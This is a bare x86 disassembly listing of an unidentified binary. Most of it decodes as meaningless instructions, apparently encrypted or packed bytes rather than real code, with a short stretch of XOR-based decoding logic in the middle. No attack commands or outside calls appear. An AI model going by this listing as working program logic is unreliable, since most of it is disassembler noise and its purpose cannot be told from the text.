  420b08:	cwde   
  420b09:	dec    edi
  420b0a:	cdq    
  420b0b:	loopne 0x420abe
  420b0d:	fcom   DWORD PTR [esi]
  420b0f:	loop   0x420aa7
  420b11:	ja     0x420b28
  420b13:	aam    0x1c
  420b15:	cld    
  420b16:	mov    al,ds:0xe63cc2b8
  420b1b:	cmc    
  420b1c:	mov    eax,0x5339ee8a
  420b21:	add    DWORD PTR [esi-0x65],ebx
  420b24:	fcmovbe st,st(3)
  420b26:	mov    ss,WORD PTR [ebp-0x70]
  420b29:	sub    edi,0xb1e41dcc
  420b2f:	cli    
  420b30:	lahf   
  420b31:	push   ss
  420b32:	ds cmp ebp,ecx
  420b35:	dec    edx
  420b36:	mov    ah,0x1d
  420b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b39:	out    dx,eax
  420b3a:	(bad)  
  420b3b:	sar    DWORD PTR gs:[edx-0x952479c],cl
  420b42:	clc    
  420b43:	mov    bl,0x5e
  420b45:	(bad)  
  420b46:	ss push ds
  420b48:	mul    BYTE PTR [edi-0x2cf1316b]
  420b4e:	mov    ah,0x85
  420b50:	out    0x2,al
  420b52:	and    esp,DWORD PTR [eax]
  420b54:	add    DWORD PTR [esi],0x47b97332
  420b5a:	in     eax,dx
  420b5b:	cld    
  420b5c:	push   ds
  420b5d:	mov    ah,0x3c
  420b5f:	jae    0x420b5e
  420b61:	or     al,0x1d
  420b63:	jne    0x420baa
  420b65:	test   BYTE PTR [esi-0x2dcb3954],dl
  420b6b:	push   esp
  420b6c:	rcr    dh,cl
  420b6e:	loop   0x420b54
  420b70:	add    DWORD PTR ds:0xbb8de224,ecx
  420b76:	imul   edx
  420b78:	retf   
  420b79:	jae    0x420bde
  420b7b:	pop    ds
  420b7c:	sub    cl,BYTE PTR [ebx-0xe77b]
  420b82:	dec    DWORD PTR [ebx-0x14373]
  420b88:	(bad)  
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [ebp+ecx*8+0x890a497],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0xd7
  420ba7:	andps  xmm0,xmm2
  420baa:	or     eax,0x3b805b7f
  420baf:	inc    ebx
  420bb0:	pop    edi
  420bb1:	dec    ebp
  420bb2:	(bad)  
  420bb4:	push   0xffffffbc
  420bb6:	push   ebp
  420bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb8:	stc    
  420bb9:	mov    es,ebp
  420bbb:	es push ecx
  420bbd:	lock (bad) 
  420bbf:	in     al,0x68
  420bc1:	dec    esi
  420bc2:	nop
  420bc3:	scas   al,BYTE PTR es:[edi]
  420bc4:	lods   eax,DWORD PTR ds:[esi]
  420bc5:	cmp    edi,edi
  420bc7:	push   esp
  420bc8:	pop    es
  420bc9:	xlat   BYTE PTR ds:[ebx]
  420bca:	pop    es
  420bcb:	dec    ebp
  420bcc:	sahf   
  420bcd:	jno    0x420b99
  420bcf:	std    
  420bd0:	lea    ebp,[ebp-0x54d51441]
  420bd6:	bound  esp,QWORD PTR [ecx+0x69]
  420bd9:	div    DWORD PTR [edi]
  420bdb:	loop   0x420c27
  420bdd:	pop    ebp
  420bde:	and    eax,0xa045a94a
  420be3:	mov    esp,0xed8d8a72
  420be8:	xchg   BYTE PTR ds:0x366e32e3,bh
  420bee:	jp     0x420bcf
  420bf0:	mov    al,ds:0x7d5feb3c
  420bf5:	inc    ebx
  420bf6:	jbe    0x420c18
  420bf8:	mov    ah,0x6d
  420bfa:	or     ebp,esp
  420bfc:	out    dx,al
  420bfd:	outs   dx,DWORD PTR ds:[esi]
  420bfe:	mov    ebp,0x99fcc825
  420c03:	das    
  420c04:	push   cs
  420c05:	push   eax
  420c06:	inc    eax
  420c07:	shr    DWORD PTR [ebx+0x65],0x91
  420c0b:	pop    ds
  420c0c:	ss popf 
  420c0e:	sbb    al,0x90
  420c10:	outs   dx,DWORD PTR ds:[esi]
  420c11:	ds or  dl,dl
  420c14:	in     al,dx
  420c15:	xor    al,0xd9
  420c17:	inc    eax
  420c18:	push   cs
  420c19:	stos   BYTE PTR es:[edi],al
  420c1a:	adc    eax,0x1a8ccfb3
  420c1f:	xlat   BYTE PTR ds:[ebx]
  420c20:	pop    ss
  420c21:	bts    ecx,eax
  420c24:	xlat   BYTE PTR ds:[ebx]
  420c25:	cmp    ah,dh
  420c27:	sbb    ah,BYTE PTR [eax+ebp*8+0x52]
  420c2b:	ja     0x420c56
  420c2d:	ret    
  420c2e:	scas   eax,DWORD PTR es:[edi]
  420c2f:	xchg   esp,eax
  420c30:	jmp    0xc601:0x66885b28
  420c37:	cmp    eax,0xeabb2221
  420c3c:	jmp    0x420c24
  420c3e:	mov    dh,ah
  420c40:	ffree  st(0)
  420c42:	stos   BYTE PTR es:[edi],al
  420c43:	mov    ch,0xce
  420c45:	or     al,0xcb
  420c47:	lods   al,BYTE PTR ds:[esi]
  420c48:	xchg   ecx,eax
  420c49:	rcl    DWORD PTR [eax+0x56],cl
  420c4c:	pop    ecx
  420c4d:	jmp    0x2252:0x4890f66a
  420c54:	ret    0xa3c0
  420c57:	fst    DWORD PTR [esi+0x40fb9ed5]
  420c5d:	in     al,0x0
  420c5f:	js     0x420c13
  420c61:	ds ins BYTE PTR es:[edi],dx
  420c63:	xchg   esi,eax
  420c64:	mov    al,0xa4
  420c66:	inc    esi
  420c67:	xor    eax,0x4ea67017
  420c6c:	pop    ds
  420c6d:	jg     0x420c55
  420c6f:	aam    0x9a
  420c71:	cmp    BYTE PTR [ecx-0x25],0xce
  420c75:	adc    DWORD PTR ss:[esi+0x1d02d526],eax
  420c7c:	and    eax,0x208411cf
  420c81:	scas   eax,DWORD PTR es:[edi]
  420c82:	clc    
  420c83:	jmp    0x79a3:0xd2a194d7
  420c8a:	rcr    BYTE PTR [ecx],cl
  420c8c:	xchg   ch,dl
  420c8e:	pop    ss
  420c8f:	fucomip st,st(2)
  420c91:	mov    bh,0xf0
  420c93:	xchg   edi,eax
  420c94:	add    eax,0x764d68b2
  420c99:	or     DWORD PTR [esi-0x2dd18c32],edx
  420c9f:	neg    DWORD PTR [ebx]
  420ca1:	cdq    
  420ca2:	stos   BYTE PTR es:[edi],al
  420ca3:	(bad)  [eax+0x4dde3a9a]
  420ca9:	retf   
  420caa:	jo     0x420d07
  420cac:	push   esp
  420cad:	jecxz  0x420c73
  420caf:	ror    DWORD PTR [edx-0x18bc197a],cl
  420cb5:	mov    al,ds:0x718feaa3
  420cba:	jecxz  0x420c7c
  420cbc:	xchg   ebx,eax
  420cbd:	add    ch,dl
  420cbf:	cmp    DWORD PTR [ebp+0x37],esp
  420cc2:	mov    dl,0x42
  420cc4:	push   eax
  420cc5:	loopne 0x420c9b
  420cc7:	fldenv [ecx-0x49]
  420cca:	adc    ebx,DWORD PTR [ecx-0x37d7563a]
  420cd0:	xor    dh,BYTE PTR [eax-0x27]
  420cd3:	pop    esp
  420cd4:	rol    BYTE PTR ds:0x9a8774d6,0xea
  420cdb:	arpl   WORD PTR [eax+0x6c],bx
  420cde:	mov    esp,0x8f1bb7e5
  420ce3:	mov    ebx,edi
  420ce5:	jmp    0xf852:0x10fbfa9e
  420cec:	(bad)  
  420cee:	rcr    BYTE PTR [ebp-0x69],0x78
  420cf2:	pop    esp
  420cf3:	shr    edx,0xa9
  420cf6:	push   0x6c8d494f
  420cfb:	mov    edi,DWORD PTR [ebp-0x1d]
  420cfe:	or     ebx,DWORD PTR ds:0xc05804df
  420d04:	xor    DWORD PTR [edi+0x6c89bba6],edi
  420d0a:	fnsave [esi]
  420d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d0d:	dec    ebp
  420d0e:	xor    bl,0x27
  420d11:	mov    ah,0x99
  420d13:	sar    BYTE PTR [ecx-0x11ece4b8],0xf6
  420d1a:	inc    esi
  420d1b:	xchg   esp,eax
  420d1c:	lahf   
  420d1d:	sub    edi,DWORD PTR [ebx-0x52]
  420d20:	addr16 out dx,al
  420d22:	and    eax,0xa883a619
  420d27:	lock nop
  420d29:	or     al,0x33
  420d2b:	dec    edx
  420d2c:	mov    ebp,DWORD PTR [esi-0x31]
  420d2f:	stos   BYTE PTR es:[edi],al
  420d30:	mov    ecx,0xce92f113
  420d35:	ds jae 0x420d5f
  420d38:	mov    eax,0xc298cf17
  420d3d:	jbe    0x420d39
  420d3f:	es dec edi
  420d41:	and    DWORD PTR ds:0xcf16ac1d,edi
  420d47:	clc    
  420d48:	mov    WORD PTR [ebp+0x66],?
  420d4b:	sbb    eax,0x2acc46c9
  420d50:	cmc    
  420d51:	pop    ebp
  420d52:	pop    ebp
  420d53:	repz (bad) 
  420d56:	xor    DWORD PTR [ebx],edi
  420d58:	pop    ds
  420d59:	fsub   QWORD PTR [ebx]
  420d5b:	xchg   ebx,eax
  420d5c:	sub    BYTE PTR [edi],0x52
  420d5f:	sbb    ecx,DWORD PTR [ecx+0x76b475f9]
  420d65:	inc    ebx
  420d66:	fst    QWORD PTR [ebp+0x61]
  420d69:	mov    DWORD PTR [edi+eiz*8-0x3b],esp
  420d6d:	mov    dl,0x59
  420d6f:	jae    0x420d4d
  420d71:	hlt    
  420d72:	ror    BYTE PTR [ecx-0x39],cl
  420d75:	add    eax,0x564e910
  420d7a:	enter  0x9505,0xc7
  420d7e:	lods   al,BYTE PTR ds:[esi]
  420d7f:	dec    ebp
  420d80:	jmp    0x420df6
  420d82:	xor    al,0xf7
  420d84:	dec    esi
  420d85:	mov    bl,0x19
  420d87:	mov    ds:0x27d5851,al
  420d8c:	ret    
  420d8d:	test   DWORD PTR [edx],esp
  420d8f:	test   esp,edi
  420d91:	or     BYTE PTR [ebx-0x2f],0xa6
  420d95:	stc    
  420d96:	lods   al,BYTE PTR ds:[esi]
  420d97:	xchg   BYTE PTR ds:0x5570f307,bh
  420d9d:	lahf   
  420d9e:	xor    al,0x3e
  420da0:	popa   
  420da1:	cmp    DWORD PTR [ebp-0x13],0xffffffbf
  420da5:	aam    0xe6
  420da7:	pushf  
  420da8:	repz scas eax,DWORD PTR es:[edi]
  420daa:	cmp    ecx,esp
  420dac:	scas   eax,DWORD PTR es:[edi]
  420dad:	into   
  420dae:	push   ebp
  420daf:	outs   dx,DWORD PTR ds:[esi]
  420db0:	std    
  420db1:	pop    esp
  420db2:	(bad)  
  420db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420db4:	dec    eax
  420db5:	xor    cl,dh
  420db7:	mov    al,0xfd
  420db9:	mov    ecx,0x7cc2d66a
  420dbe:	dec    edi
  420dbf:	or     al,0xef
  420dc1:	inc    ebp
  420dc2:	pop    esp
  420dc3:	nop
  420dc4:	fwait
  420dc5:	inc    esp
  420dc6:	mov    dl,al
  420dc8:	jae    0x420dc5
  420dca:	sbb    bl,dh
  420dcc:	push   eax
  420dcd:	xor    eax,0x337d3016
  420dd2:	imul   ebx,eax,0x49
  420dd5:	loopne 0x420dbb
  420dd7:	push   0x23
  420dd9:	mov    eax,ds:0xff312310
  420dde:	idiv   BYTE PTR [ebp+0x69]
  420de1:	inc    edi
  420de2:	stos   DWORD PTR es:[edi],eax
  420de3:	sub    edi,DWORD PTR [eax*8-0xf207400]
  420dea:	scas   eax,DWORD PTR es:[edi]
  420deb:	fild   WORD PTR [esi+ebp*1]
  420dee:	add    eax,0x1252597b
  420df3:	mov    dl,0xc6
  420df5:	mov    ds:0x4339f734,eax
  420dfa:	and    DWORD PTR [ebp+0x21ead559],ebx
  420e00:	cli    
  420e01:	arpl   si,cx
  420e03:	fld    TBYTE PTR [eax-0x6ee2473c]
  420e09:	push   edi
  420e0a:	xlat   BYTE PTR ds:[ebx]
  420e0b:	sbb    al,0xe2
  420e0d:	cmp    BYTE PTR ds:0xd71a5f84,0x1
  420e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e15:	add    DWORD PTR [eax-0x24c69458],esi
  420e1b:	in     al,0x5a
  420e1d:	out    0x90,al
  420e1f:	jecxz  0x420e57
  420e21:	popf   
  420e22:	sbb    eax,0x4285eafa
  420e27:	int    0xfa
  420e29:	cmc    
  420e2a:	adc    DWORD PTR [edi+edi*2+0x56],ecx
  420e2e:	rol    cx,1
  420e31:	mov    edx,0x54f6f1c9
  420e36:	jae    0x420e94
  420e38:	mov    bh,0x55
  420e3a:	mov    ch,0x10
  420e3c:	ror    al,cl
  420e3e:	fadd   QWORD PTR [edi+0x5e089790]
  420e44:	mov    al,0x7e
  420e46:	cmp    BYTE PTR [esp+eiz*4],bl
  420e49:	out    dx,al
  420e4a:	pop    ecx
  420e4b:	jnp    0x420e24
  420e4d:	jmp    0xaef5d1ca
  420e52:	add    edi,DWORD PTR [esi+0x31]
  420e55:	inc    edi
  420e56:	fldenv [edi]
  420e58:	push   ecx
  420e59:	int    0x66
  420e5b:	outs   dx,BYTE PTR ds:[esi]
  420e5c:	es clc 
  420e5e:	fisttp DWORD PTR [ecx-0x7]
  420e61:	xchg   esi,eax
  420e62:	loopne 0x420e67
  420e64:	nop
  420e65:	xor    eax,0xd58606b9
  420e6a:	repz (bad) 
  420e6c:	xchg   edi,eax
  420e6d:	mov    ds:0xc6d1c104,eax
  420e72:	xor    eax,0x2e81aadd
  420e77:	dec    esi
  420e78:	sbb    al,0x32
  420e7a:	mov    bh,0x66
  420e7c:	int    0x1f
  420e7e:	fmul   st,st(5)
  420e80:	pop    es
  420e81:	mov    ebx,DWORD PTR [esi+0x74]
  420e84:	fwait
  420e85:	nop
  420e86:	test   eax,0xaef8ef2a
  420e8b:	add    BYTE PTR [ecx],cl
  420e8d:	in     eax,dx
  420e8e:	mov    dl,0xff
  420e90:	dec    eax
  420e91:	adc    bl,BYTE PTR [ecx-0x3c]
  420e94:	push   esp
  420e95:	mov    BYTE PTR [ecx],0x39
  420e98:	adc    esp,DWORD PTR ds:0x55a6857f
  420e9e:	pop    ss
  420e9f:	mov    dl,0x6a
  420ea1:	sbb    eax,0x5af6a9fb
  420ea6:	test   BYTE PTR [esp+esi*1],ch
  420ea9:	mov    dl,0x7
  420eab:	outs   dx,BYTE PTR ds:[esi]
  420eac:	xchg   esp,eax
  420ead:	inc    eax
  420eae:	inc    ecx
  420eaf:	sbb    al,0xd5
  420eb1:	ss in  eax,0x17
  420eb4:	cmp    eax,0x3644d137
  420eb9:	sahf   
  420eba:	hlt    
  420ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebc:	sub    eax,DWORD PTR [ecx-0x5a]
  420ebf:	xor    DWORD PTR [esi+0x647a8ade],edx
  420ec5:	cmp    eax,0x74dffa4b
  420eca:	dec    edi
  420ecb:	pusha  
  420ecc:	popa   
  420ecd:	mov    esi,0xf0506bd8
  420ed2:	in     eax,dx
  420ed3:	fcomp  DWORD PTR [edx]
  420ed5:	lds    eax,FWORD PTR [edx+0x1889457e]
  420edb:	add    eax,0x6fdb3c64
  420ee0:	in     al,dx
  420ee1:	xor    al,0x6f
  420ee3:	scas   eax,DWORD PTR es:[edi]
  420ee4:	cvtpi2ps xmm7,QWORD PTR [esi+0x2d7e53b9]
  420eeb:	mov    ch,0xdd
  420eed:	cmc    
  420eee:	mov    al,0x67
  420ef0:	xor    dl,bl
  420ef2:	loope  0x420f70
  420ef4:	(bad)  
  420ef5:	imul   DWORD PTR [eax+0x37e77d1d]
  420efb:	xchg   esi,eax
  420efc:	jecxz  0x420ef0
  420efe:	cmp    BYTE PTR [ebx+ebx*4+0x2dd5e2b2],al
  420f05:	xor    ecx,DWORD PTR ds:0xd50a3223
  420f0b:	(bad)  
  420f0c:	fsubr  QWORD PTR [ebx-0x6a]
  420f0f:	mov    esp,0xe80cb46
  420f14:	mov    bh,0x4
  420f16:	xchg   edi,eax
  420f17:	iret   
  420f18:	mov    dl,0xc2
  420f1a:	loop   0x420ed4
  420f1c:	adc    ch,BYTE PTR [esi]
  420f1e:	lea    esp,fs:[eax+ebp*1-0x4e2df1dd]
  420f26:	jl     0x420ede
  420f28:	es jno 0x420f9b
  420f2b:	mov    ds:0xce8e34b3,al
  420f30:	mov    esp,0x251f04d8
  420f35:	imul   esp,DWORD PTR [edx-0x76e85787],0xb
  420f3c:	xchg   bh,al
  420f3e:	pop    es
  420f3f:	stc    
  420f40:	add    al,0x21
  420f42:	fld    DWORD PTR [ebx]
  420f44:	push   es
  420f45:	and    eax,0x659cb914
  420f4a:	sbb    al,0x4d
  420f4c:	and    edi,DWORD PTR cs:[edi-0x1d]
  420f50:	push   edi
  420f51:	ins    DWORD PTR es:[edi],dx
  420f52:	xor    BYTE PTR [esi+eax*2-0x64e073ac],0x9d
  420f5a:	dec    edi
  420f5c:	retf   0x161b
  420f5f:	scas   eax,DWORD PTR es:[edi]
  420f60:	test   BYTE PTR [edi+ebx*2+0x371c9279],ch
  420f67:	dec    esp
  420f68:	(bad)  
  420f69:	mov    al,0x5c
  420f6b:	adc    ecx,DWORD PTR [edi-0x23]
  420f6e:	imul   ebp,DWORD PTR [ebx],0xf18483b
  420f74:	test   BYTE PTR [edi],bh
  420f76:	adc    al,BYTE PTR [eax]
  420f78:	add    BYTE PTR [ebx-0x1437b],cl
  420f7e:	dec    DWORD PTR [ebx+0x558bc84d]
  420f84:	or     BYTE PTR [ebx],al
  420f86:	adc    al,0x81
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	shl    BYTE PTR [ebp-0x4c6c5b37],1
  421052:	sar    BYTE PTR [esi-0x41413bb6],0xcf
  421059:	fwait
  42105a:	sti    
  42105b:	xchg   ebx,eax
  42105c:	repz and edi,esi
  42105f:	jl     0x421016
  421061:	in     al,0xba
  421063:	or     edi,edi
  421065:	dec    edi
  421066:	lds    esi,FWORD PTR [bp+di-0x5af6]
  42106b:	add    edi,DWORD PTR [edi-0x3f]
  42106e:	sub    DWORD PTR [esi-0x32],ecx
  421071:	pop    ecx
  421072:	dec    ecx
  421073:	xchg   BYTE PTR [ecx],ah
  421075:	mul    al
  421077:	or     dl,ah
  421079:	sbb    esp,DWORD PTR [ebp+0x75]
  42107c:	pop    ecx
  42107d:	xchg   ebx,eax
  42107e:	mov    al,ds:0xc3865d2a
  421083:	mov    WORD PTR [ecx+edx*1+0x67],?
  421087:	ja     0x42107a
  421089:	loope  0x4210bc
  42108b:	mov    ah,0xa6
  42108d:	lock ins BYTE PTR es:[edi],dx
  42108f:	in     al,dx
  421090:	pop    esp
  421091:	retf   0x7e79
  421094:	cmp    esp,edx
  421096:	cmp    BYTE PTR [esi+0xb57e880],0x23
  42109d:	cmp    eax,0x57898a08
  4210a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210a3:	bound  ebx,QWORD PTR [edi+0x338165bf]
  4210a9:	pop    ebp
  4210ab:	xor    eax,0x241b0265
  4210b0:	xchg   ebp,eax
  4210b1:	retf   
  4210b2:	sub    BYTE PTR [esi+0x64da79bb],al
  4210b8:	or     BYTE PTR [esi+0x5c],0x64
  4210bc:	rcr    esp,0x92
  4210bf:	cmp    BYTE PTR [ebx-0x38],dl
  4210c2:	sub    DWORD PTR [esi+ecx*1],ecx
  4210c5:	xor    dl,ch
  4210c7:	popf   
  4210c8:	adc    cl,BYTE PTR [edx+0x1a]
  4210cb:	cld    
  4210cc:	inc    esi
  4210cd:	push   esi
  4210ce:	mov    esi,0x3fe0457f
  4210d3:	pop    ebp
  4210d4:	or     eax,0xfcaa041d
  4210d9:	call   0x5d18:0x49ef9f18
  4210e0:	inc    eax
  4210e1:	shl    ecx,cl
  4210e3:	icebp  
  4210e4:	popf   
  4210e5:	(bad)  
  4210e6:	stos   BYTE PTR es:[edi],al
  4210e7:	je     0x421105
  4210e9:	push   0x601f2e11
  4210ee:	push   cs
  4210ef:	mov    ah,0x7e
  4210f1:	pop    es
  4210f2:	add    ah,dl
  4210f4:	test   DWORD PTR [ebp-0x35],ebp
  4210f7:	adc    edi,DWORD PTR [ebp+0x4]
  4210fa:	xchg   DWORD PTR [edx-0x40],edi
  4210fd:	xor    eax,DWORD PTR [ebx]
  4210ff:	es pop ds
  421101:	mov    dh,BYTE PTR [esi]
  421103:	jne    0x42113d
  421105:	das    
  421106:	fs mov eax,0xc199c4d5
  42110c:	cmp    DWORD PTR [eax+0x483e733a],esp
  421112:	jbe    0x4210bc
  421114:	sub    DWORD PTR [ecx],ebp
  421116:	in     eax,dx
  421117:	jno    0x4210ec
  421119:	mov    edx,0x97688bec
  42111e:	pop    esi
  42111f:	jmp    DWORD PTR [ebx-0x9]
  421122:	mov    eax,ds:0xff49b99b
  421127:	(bad)  
  421128:	cli    
  421129:	mov    eax,ds:0xf33d46bc
  42112e:	cmc    
  42112f:	or     DWORD PTR [edi+eiz*8+0x3a],esi
  421133:	inc    esi
  421134:	cmp    DWORD PTR [eax+0x10],ebp
  421137:	xlat   BYTE PTR ds:[ebx]
  421138:	test   DWORD PTR [ebx+0x65807eeb],ebp
  42113e:	nop
  42113f:	mov    cl,0x2c
  421141:	out    0x26,al
  421143:	sub    al,0x98
  421145:	or     eax,0xb8c9c8f
  42114a:	retf   0xaa79
  42114d:	int    0x53
  42114f:	mov    al,ds:0x7185118b
  421154:	mov    cl,0xa
  421156:	pop    ss
  421157:	icebp  
  421158:	outs   dx,BYTE PTR ds:[esi]
  421159:	pop    esp
  42115a:	repz pop ds
  42115c:	mov    al,0xc1
  42115e:	leave  
  42115f:	add    eax,DWORD PTR [ecx+0x3c]
  421162:	cdq    
  421163:	sbb    al,0x5b
  421165:	push   0x7c
  421167:	inc    ebx
  421168:	mov    ds:0x2bcf1036,al
  42116d:	dec    ecx
  42116e:	xchg   ecx,eax
  42116f:	retf   0x4c68
  421172:	xchg   ebx,eax
  421173:	push   edx
  421174:	or     eax,0xef5716e3
  421179:	addr16 pop esp
  42117b:	mov    edi,edi
  42117d:	mov    eax,ds:0xccb7115d
  421182:	int3   
  421183:	push   ecx
  421184:	leave  
  421185:	lock jle 0x42111d
  421188:	adc    al,BYTE PTR ds:0x9bb446eb
  42118e:	and    eax,0xd2ce120a
  421193:	push   cs
  421194:	jno    0x4211e2
  421196:	(bad)
  421199:	aaa    
  42119a:	sbb    al,BYTE PTR [edx+esi*1-0x52d791a]
  4211a1:	pop    ss
  4211a2:	jp     0x4211e4
  4211a4:	sbb    al,0xce
  4211a6:	aam    0x5a
  4211a8:	mov    eax,0x86450efc
  4211ad:	call   0x20a1:0xadc506cb
  4211b4:	or     al,0x1f
  4211b6:	clc    
  4211b7:	jmp    0x1d73bcc1
  4211bc:	(bad)  
  4211bd:	pusha  
  4211be:	xor    al,0x45
  4211c0:	(bad)  
  4211c1:	or     ebx,edi
  4211c3:	dec    esp
  4211c4:	aad    0x5c
  4211c6:	adc    al,0x28
  4211c8:	mov    DWORD PTR [edi],edx
  4211ca:	mov    ds:0xfffeaeb2,eax
  4211cf:	(bad)  
  4211d0:	xchg   ebx,eax
  4211d1:	inc    edx
  4211d2:	adc    dh,BYTE PTR [ebx+0x193d7ed1]
  4211d8:	pop    eax
  4211d9:	test   DWORD PTR [esp+eax*2],edx
  4211dc:	ficom  DWORD PTR [edx]
  4211de:	mov    dl,0x20
  4211e0:	dec    esp
  4211e1:	inc    ebx
  4211e2:	sbb    esp,DWORD PTR [ebx]
  4211e4:	test   al,0xbe
  4211e6:	frstor [edi+0x73be44da]
  4211ec:	sahf   
  4211ed:	dec    eax
  4211ee:	loope  0x421244
  4211f0:	loope  0x421214
  4211f2:	push   0x22a744ae
  4211f7:	mov    ebx,0x4ada7e67
  4211fc:	dec    esp
  4211fd:	mov    eax,ds:0x8b79fbb7
  421202:	add    dh,BYTE PTR [edi+eax*8-0x7b95d7e2]
  421209:	mov    esp,0x14cbdc5
  42120e:	xor    eax,0xb1625e6d
  421213:	or     cl,BYTE PTR [ecx]
  421215:	sbb    ah,0x40
  421218:	xor    esi,0x7a
  42121b:	cmc    
  42121c:	pop    ds
  42121d:	retf   0x72c2
  421220:	mov    esi,0x4f245c63
  421225:	inc    ebx
  421226:	cmc    
  421227:	jle    0x4211fb
  421229:	sub    BYTE PTR [ecx+0x75cf2e5f],dh
  42122f:	int    0x89
  421231:	std    
  421232:	cs jo  0x42127c
  421235:	rol    DWORD PTR [ebp+edi*2-0xd],1
  421239:	sbb    eax,0x3e3fe751
  42123e:	cmp    al,0x4c
  421240:	or     dh,BYTE PTR [ecx]
  421242:	outs   dx,BYTE PTR ds:[esi]
  421243:	(bad)  
  421244:	(bad)  
  421245:	into   
  421246:	test   eax,0xf943f885
  42124b:	lods   al,BYTE PTR ds:[esi]
  42124c:	lahf   
  42124d:	xchg   ebx,eax
  42124e:	test   al,0x76
  421250:	and    DWORD PTR [eax+0x1d],eax
  421253:	and    DWORD PTR [ecx-0x47046730],edi
  421259:	inc    ecx
  42125a:	pop    ebx
  42125b:	retf   0x5655
  42125e:	sbb    BYTE PTR [eax+ebx*2+0x4a],cl
  421262:	out    0xc,eax
  421264:	cmovns esi,DWORD PTR [eax]
  421267:	jb     0x421210
  421269:	int3   
  42126a:	jp     0x4211fe
  42126c:	js     0x4212b4
  42126e:	rcr    BYTE PTR [ecx-0x27],1
  421271:	and    eax,eax
  421273:	clc    
  421274:	shl    DWORD PTR [ecx+0x116cabb7],1
  42127a:	mov    ch,0x39
  42127c:	cmp    DWORD PTR [ecx+0x566bf54b],0x2d584d5a
  421286:	icebp  
  421287:	xchg   ecx,eax
  421288:	ss jg  0x4212de
  42128b:	adc    bh,BYTE PTR [ebp-0x42e7e731]
  421291:	jae    0x42123c
  421293:	lds    esi,FWORD PTR [eax]
  421295:	add    dl,BYTE PTR [ecx-0x6681082a]
  42129b:	adc    eax,ebp
  42129d:	mov    ah,0x90
  42129f:	imul   eax,DWORD PTR cs:[edx],0x52a89d48
  4212a6:	xchg   edi,eax
  4212a7:	lock fiadd WORD PTR [esi+0x42]
  4212ab:	mov    DWORD PTR [si],ebx
  4212ae:	xchg   DWORD PTR [edi+0x2fe0eaf3],eax
  4212b4:	aaa    
  4212b5:	sbb    eax,0x228d2530
  4212ba:	stc    
  4212bb:	cmc    
  4212bc:	mov    ch,0x1f
  4212be:	loopne 0x42129e
  4212c0:	repnz fdivp st(7),st
  4212c3:	jae    0x421289
  4212c5:	dec    ebx
  4212c6:	jb     0x421281
  4212c8:	sub    eax,0x72102843
  4212cd:	or     DWORD PTR [ebx-0x242b3c03],eax
  4212d3:	jecxz  0x42125b
  4212d5:	push   eax
  4212d6:	dec    eax
  4212d7:	or     DWORD PTR ds:0xd39fdc11,esp
  4212dd:	int3   
  4212de:	sub    DWORD PTR [esi],esi
  4212e0:	js     0x421360
  4212e2:	fcom   st(5)
  4212e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212e5:	(bad)  
  4212e6:	push   edx
  4212e7:	daa    
  4212e8:	mov    al,0xea
  4212ea:	xor    BYTE PTR [eax+0x1e],dh
  4212ed:	push   ecx
  4212ee:	stos   DWORD PTR es:[edi],eax
  4212ef:	out    dx,al
  4212f0:	push   ecx
  4212f1:	scas   eax,DWORD PTR es:[edi]
  4212f2:	pop    ebx
  4212f3:	mov    bl,0x0
  4212f5:	icebp  
  4212f6:	push   ss
  4212f7:	pop    es
  4212f8:	mov    edx,0x36d9bc2f
  4212fd:	jl     0x421344
  4212ff:	sub    esi,esi
  421301:	es push 0xffffff82
  421304:	push   ebp
  421305:	mov    cl,ch
  421307:	mov    ?,WORD PTR [edi+0x67]
  42130a:	(bad)  
  42130b:	jbe    0x4212ff
  42130d:	rcr    DWORD PTR [esi],1
  42130f:	and    ebx,DWORD PTR [ebp+0x34]
  421312:	frstor [esi-0x8]
  421315:	fwait
  421316:	add    eax,0x4f9929c8
